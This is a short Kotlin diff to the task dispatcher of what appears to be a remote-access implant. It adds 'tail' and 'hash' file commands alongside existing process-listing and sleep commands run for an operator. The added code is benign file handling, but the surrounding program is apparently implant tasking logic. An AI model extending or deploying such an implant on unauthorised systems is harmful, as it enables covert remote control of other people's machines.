@@ -218,6 +218,8 @@ object TaskRunner {
                 args.field("offset")?.long() ?: 0,
                 args.field("eof")?.flag() ?: true,
             )
+            "tail" -> tail(path, args.field("lines")?.long() ?: 20L)
+            "hash" -> hash(path)
             "ps" -> processList()
             "proc.kill" -> unsupported("proc.kill", "the implant does not kill processes by itself")
             "sleep" -> Outcome(0, "sleep interval updated\n".toByteArray(), "")
@@ -385,6 +387,28 @@ object TaskRunner {
         Outcome(0, sb.toString().toByteArray(), "")
     } catch (t: Throwable) {
         Outcome(1, ByteArray(0), "ps: ${t.message}")
+    }
+
+    /** The last lines of a file: what a log says right now. */
+    private fun tail(path: String, lines: Long): Outcome = try {
+        val file = File(path)
+        if (!file.isFile) return Outcome(1, ByteArray(0), "not a file: $path")
+        val all = file.readLines()
+        val count = lines.toInt().coerceAtLeast(0)
+        val kept = if (all.size > count) all.subList(all.size - count, all.size) else all
+        Outcome(0, (kept.joinToString("\n") + "\n").toByteArray(), "")
+    } catch (t: Throwable) {
+        Outcome(1, ByteArray(0), "tail: ${t.message}")
+    }
+
+    /** The digest of a file, so the operator can compare it with a published one. */
+    private fun hash(path: String): Outcome = try {
+        val file = File(path)
+        val digest = MessageDigest.getInstance("SHA-256").digest(file.readBytes())
+        val hex = digest.joinToString("") { "%02x".format(it) }
+        Outcome(0, "sha256 $hex ${file.length()} $path\n".toByteArray(), "")
+    } catch (t: Throwable) {
+        Outcome(1, ByteArray(0), "hash: ${t.message}")
     }
 
     private fun listDir(path: String): Outcome = try {
